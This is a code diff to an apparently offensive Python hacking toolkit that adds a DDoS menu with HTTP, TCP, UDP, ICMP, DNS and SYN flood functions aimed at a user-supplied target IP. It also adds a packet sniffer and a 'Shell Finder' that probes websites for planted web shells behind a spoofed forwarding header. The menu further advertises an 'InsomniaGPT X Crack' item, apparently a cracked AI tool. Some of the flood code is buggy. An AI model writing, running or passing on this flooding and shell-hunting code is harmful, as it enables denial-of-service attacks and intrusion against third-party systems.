@@ -50,6 +50,8 @@ import random
 from colorama import Fore, Back, Style, init
 import threading, socket, random, http.client, scapy.all
 from scapy.all import IP, TCP, sr1, ARP, Ether, srp
+import struct, string
+from scapy.all import *
 
 global count
 global attack
@@ -116,6 +118,25 @@ except ImportError or ModuleNotFoundError:
     os.system('pip install adafruit-circuitpython-adafruitio')
     os.system('pip install adafruit-circuitpython-motor')
     os.system('pip install adafruit-circuitpython-circuitplayground')
+def ddos20():
+    if os.name == "posix":
+        os.system('clear')
+    elif os.name == "nt":
+        os.system('cls')
+    print(info + f'            [ ]Remember !, If The Tools Had A Error, Please Waiting For The Update.[ ]')
+    print(f"""    {yellow}┌─────────────────────────────────────────────────────────────────────────────────────────────────┐{blue}
+    {yellow}│{blue} [01] HTTP FLOOD                                                                                 {yellow}│{blue}
+    {yellow}│{blue} [02] TCP FLOOD                                                                                  {yellow}│{blue}
+    {yellow}│{blue} [03] UDP FLOOD                                                                                  {yellow}│{blue}
+    {yellow}│{blue} [04] ICMP FLOOD                                                                                 {yellow}│{blue}
+    {yellow}│{blue} [05] DNS FLOOD                                                                                  {yellow}│{blue}
+    {yellow}│{blue} [06] SYN FLOOD                                                                                  {yellow}│{blue}
+    {yellow}│{blue} [07] Network Monitor {red}[Real Hot]{blue}                                                                 {yellow}│{blue}
+    {yellow}│{blue}                                                                                                 {yellow}│{blue}
+    {yellow}│{blue}                                                                                                 {yellow}│{blue}
+    {yellow}│{blue}                                                                                                 {yellow}│{blue}
+    {yellow}└─────────────────────────────────────────────────────────────────────────────────────────────────┘{blue}
+    """)
 def m2():
     if os.name == "posix":
         os.system('clear')
@@ -124,8 +145,8 @@ def m2():
     print(info + f'            [ ]Remember !, If The Tools Had A Error, Please Waiting For The Update.[ ]')
     print(f"""    {yellow}┌─────────────────────────────────────────────────────────────────────────────────────────────────┐{blue}
     {yellow}│{blue} [01] InsomniaGPT X Crack {red}[Hot AF]{blue}                                                               {yellow}│{blue}
-    {yellow}│{blue}                                                                                                 {yellow}│{blue}
-    {yellow}│{blue}                                                                                                 {yellow}│{blue}
+    {yellow}│{blue} [02] DDOS {red}[Hot AF]{blue}                                                                              {yellow}│{blue}
+    {yellow}│{blue} [03] Shell Finder                                                                               {yellow}│{blue}
     {yellow}│{blue}                                                                                                 {yellow}│{blue}
     {yellow}│{blue}                                                                                                 {yellow}│{blue}
     {yellow}│{blue}                                                                                                 {yellow}│{blue}
@@ -135,7 +156,6 @@ def m2():
     {yellow}│{blue}                                                                                                 {yellow}│{blue}
     {yellow}└─────────────────────────────────────────────────────────────────────────────────────────────────┘{blue}
     """)
-    print('')
 print(f"""
 {red}                                       @@@@@@@@@%%@@@@@@@@@                        
                                   @@@#-:.              .:-#@@@                    
@@ -4105,6 +4125,307 @@ elif answer == ("20"):
             else:
                 print("Not valid.")
                 exit()
+        elif answer == '2':
+            pass
+            ddos20()
+            print('')
+            print(f'\033[37m')
+            print(f"╭─[{yellow} PANDORA@localhost {white} ~/more")
+            answer = input("╰─$ ")
+            print('\033[1;32m\n')
+            if answer == '1':
+                http = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                ip = input("Target IP : ")
+                port = int(input("Port : "))
+                thrd = input("Threads : ")
+                def startshttp():
+                    http.connect((ip,port))
+                    http.send("GET / HTTP/1.1\r\nHost: {}\r\nContent-Length : 100\r\n".format(ip))
+                    http.close()
+                for i in range(int(thrd)):
+                    t = threading.Thread(target=startshttp)
+                    t.start()
+                print("Finished.")
+            elif answer == '2':
+                syn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                syn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+                ip = input("Target IP : ")
+                port = int(input("Port : "))
+                thrd = input("Threads : ")
+                headers = [
+                    b"\x00\x20\xe0\x21\x00\x02\x01\x10\x22\x23\x24\x25",
+                    b"\x01\x30\xe0\x31\x00\x03\x02\x11\x21\x22\x23\x24",
+                    b"\x02\x40\xe0\x40\x00\x04\x03\x12\x32\x33\x34\x35",
+                    b"\x03\x50\xe0\x51\x00\x05\x04\x13\x43\x44\x45\x46",
+                    b"\x04\x60\xe0\x61\x00\x06\x05\x14\x54\x55\x56\x57"
+                ]
+
+                def tcp_flood(ip, port, headers):
+                    # Create a TCP socket
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+                    # Set TCP_NODELAY option to send packets immediately
+                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+
+                    try:
+                        # Connect to the target
+                        s.connect((ip, port))
+
+                        # Send TCP headers
+                        for header in headers:
+                            s.send(header)
+
+                        # Close the connection
+                        s.close()
+                        
+                    except Exception as e:
+                        print(f"An error occurred: {str(e)}")
+
+                # Start TCP flood
+                for i in range(int(thrd)):
+                    t = threading.Thread(target=tcp_flood, args=[ip, port, headers])
+                    t.start()
+                print("Finished.")
+            elif answer == '3':
+                udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                ip = input("Target IP : ")
+                port = int(input("Port : "))
+                thrd = input("Threads : ")
+                class UDPHeader:
+                    def __init__(self, source_port, dest_port, length, checksum):
+                        self.source_port = source_port
+                        self.dest_port = dest_port
+                        self.length = length
+                        self.checksum = checksum
+
+                    def build_header(self):
+                        return struct.pack('!HHHH', self.source_port, self.dest_port, self.length, self.checksum)
+
+                source_port = 80
+                dest_port = port
+                length = 60
+                checksum = 15
+
+                udp_header = UDPHeader(source_port, dest_port, length, checksum)
+                header_data = udp_header.build_header()
+                def startsudp():
+                    udp.connect((ip ,port))
+                    udp.sendto((header_data), (ip, port))
+                    udp.close()
+                for i in range(int(thrd)):
+                    t = threading.Thread(target=startsudp)
+                    t.start()
+                print("Finished.")
+            elif answer == '4':
+                icmp = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+                ip = input("Target IP : ")
+                port = int(input("Port : "))
+                thrd = input("Threads : ")
+                def starticmp():
+                    def create_icmp_header():
+                        # ICMP header structure
+                        icmp_type = 8     # ICMP Echo Request Type
+                        icmp_code = 0     # ICMP Echo Request Code
+                        icmp_checksum = 0 # ICMP Checksum
+                        icmp_id = 12345   # ICMP Identifier
+                        icmp_seq = 0      # ICMP Sequence Number
+
+                        # Pack the ICMP header into a byte string
+                        icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
+
+                        # Calculate ICMP checksum
+                        checksum = 0
+                        checksum = socket.htons(checksum)
+                        checksum += (icmp_type + icmp_code + icmp_id + icmp_seq)
+                        checksum = (checksum >> 16) + (checksum & 0xffff)
+                        checksum += (checksum >> 16)
+                        checksum = ~checksum & 0xffff
+                        checksum = socket.htons(checksum)
+
+                        # Replace the checksum in the ICMP header
+                        icmp_header = icmp_header[:2] + struct.pack("!H", checksum) + icmp_header[4:]
+
+                        return icmp_header
+
+                    def send_icmp_packet(target_ip):
+                        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+
+                        # Set the socket options to allow sending ICMP packets
+                        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+
+                        # Create the ICMP header
+                        icmp_header = create_icmp_header()
+
+                        while True:
+                            sock.sendto(icmp_header, (target_ip, 0))
+                            print(f"Sent ICMP packet to {target_ip}")
+
+                    if __name__ == "__main__":
+                        pass
+                        for i in range(thrd):
+                            t = threading.Thread(target=send_icmp_packet, args=[ip])
+                            t.start()
+            #dnsf
+            elif answer == '5':
+                target_ip = input("Enter the target IP address: ")
+                target_port = int(input("Enter the target port: "))
+                duration = int(input("Enter the Threads: "))
+
+                def dns_flood(target_ip, target_port, duration):
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    packet_length = random.randint(1, 1024)
+                    dns_data = ''.join(random.choices(string.ascii_letters + string.digits, k=packet_length))
+
+                    while True:
+                        try:
+                            sock.sendto(dns_data.encode(), (target_ip, target_port))
+                        except KeyboardInterrupt:
+                            break
+                for i in range(duration):
+                    t = threading.Thread(target=dns_flood, args=[target_ip, target_port, duration])
+                    t.start()
+            elif answer == '6':
+                # Target IP and Port
+                target_ip = input("Enter the target IP address: ")
+                target_port = int(input("Enter the target port: "))
+                thrd = int(input("Threads : "))
+                # Function to create a TCP SYN packet
+                def create_syn_packet(source_ip, dest_ip, dest_port):
+                    # IP Header
+                    ip_header = struct.pack('!BBHHHBBH4s4s',
+                                            69,              # Version and Internet Header Length (IHL)
+                                            0,               # Type of Service (TOS)
+                                            40,              # Total Length
+                                            0,               # Identification
+                                            54321,           # Flags and Fragment Offset
+                                            100,             # Time to Live (TTL)
+                                            socket.IPPROTO_TCP, # Protocol (TCP)
+                                            0,               # Header Checksum
+                                            socket.inet_aton(source_ip), # Source IP
+                                            socket.inet_aton(dest_ip)    # Destination IP
+                                            )
+                    # TCP Header
+                    tcp_header = struct.pack('!HHIIBBHHH',
+                                            1234,        # Source Port
+                                            dest_port,   # Destination Port
+                                            0,           # Sequence Number
+                                            0,           # Acknowledgement Number
+                                            80,          # Data Offset, Reserved, and Flags (TCP SYN flag is set)
+                                            socket.IPPROTO_TCP, # Window Size
+                                            0,           # Checksum
+                                            0,           # Urgent Pointer
+                                            )
+                    # Pseudo Header (used for TCP checksum calculation)
+                    source_address = socket.inet_aton(source_ip)
+                    dest_address = socket.inet_aton(dest_ip)
+                    placeholder = 0
+                    protocol = socket.IPPROTO_TCP
+                    tcp_length = len(tcp_header)
+                    pseudo_header = struct.pack('!4s4sBBH',
+                                                source_address,  # Source IP
+                                                dest_address,    # Destination IP
+                                                placeholder,     # Zeros
+                                                protocol,        # Protocol (TCP)
+                                                tcp_length       # Length of TCP header
+                                                )
+                    # Calculate TCP Checksum
+                    tcp_checksum = checksum(pseudo_header + tcp_header)
+
+                    # Complete TCP Packet (including IP and TCP headers)
+                    packet = ip_header + tcp_header
+
+                    # Set the TCP Checksum in the TCP header
+                    packet = packet[:36] + struct.pack('H', tcp_checksum) + packet[38:]
+
+                    return packet
+
+                # Function to calculate the checksum
+                def checksum(data):
+                    checksum = 0
+                    if len(data) % 2 == 1:
+                        data += b"\x00"
+                    for i in range(0, len(data), 2):
+                        w = int.from_bytes(data[i:i+2], byteorder="big")
+                        checksum += w
+                    checksum = (checksum >> 16) + (checksum & 0xffff)
+                    checksum = ~checksum & 0xffff
+                    return checksum
+
+                # Perform SYN Flood Attack
+                def syn_flood(target_ip, target_port):
+                    source_ip = "192.168.0.1"  # Replace with your desired source IP
+                    num_packets = 1000
+
+                    # Create the SYN packet and send it repeatedly
+                    syn_packet = create_syn_packet(source_ip, target_ip, target_port)
+                    for _ in range(num_packets):
+                        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+                        s.sendto(syn_packet, (target_ip, target_port))
+                        s.close()
+                        print("SYN packet sent to {}:{}".format(target_ip, target_port))
+
+                # Call the SYN Flood function
+                for i in range(thrd):
+                    t = threading.Thread(target=syn_flood, args=[target_ip, target_port])
+                    t.start()
+            elif answer == '7':
+                print("Monitoring..")
+                def monitor_network():
+                    while True:
+                        try:
+                            packets = sniff(count=1)
+
+                            # Extracting packet details
+                            for packet in packets:
+                                packet_info = "Packet Details:\n"
+                                packet_info += f"Source IP: {packet[IP].src}\n"
+                                packet_info += f"Destination IP: {packet[IP].dst}\n"
+                                packet_info += f"Protocol: {packet[IP].proto}\n"
+                                packet_info += f"Length: {len(packet)}\n"
+                                packet_info += f"Headers:\n{packet.show()}\n"
+
+                                # Printing packet details
+                                print(packet_info)
+
+                            time.sleep(1) # Refresh every 1 second
+                        except:
+                            continue
+                # Start monitoring network
+                monitor_network()
+        elif answer == '3':
+            def search_shell(site_target):
+                sj = input("Add Shells Name To Search [Example : IndoXploit.php,Mini.php,Admin.php ]: ")
+                shel = sj.split(',')
+                shelz = shel
+                fake_ip = '.'.join(str(random.randint(0, 255)) for _ in range(4))
+                shells = shelz  # add more shell names if needed
+
+                response = requests.get(site_target, headers={"X-Forwarded-For": fake_ip})
+                soup = BeautifulSoup(response.content, 'html.parser')
+
+                for shell in shells:
+                    result = soup.find('a', href=shell)
+                    for results in search(f"site:{site_target} inurl:{shell}", num=int(1), start=0, stop=None, pause=2):
+                        try:
+                            if results:
+                                results = results
+                        except:
+                            continue
+                    if result:
+                        shell_name = result['href']
+                        shell_size = result['size']
+
+                        shell_details = soup.find('div', class_='details')
+                        injected_on = shell_details.find('span', class_='injected-on').text if shell_details else 'None'
+
+                        print(f"Shell Name: {shell_name}")
+                        print(f"Size: {shell_size}")
+                        print(f"Injected On: {injected_on}")
+                        print(f"Site: {site_target}")
+                    elif results:
+                        print('\n[~] Shells In {} :'.format(site_target), results, '\n')
+            site_target = input("Enter the target URL: ")
+            search_shell(site_target)
     else:
         print(green + f"Exit..")
         exit()
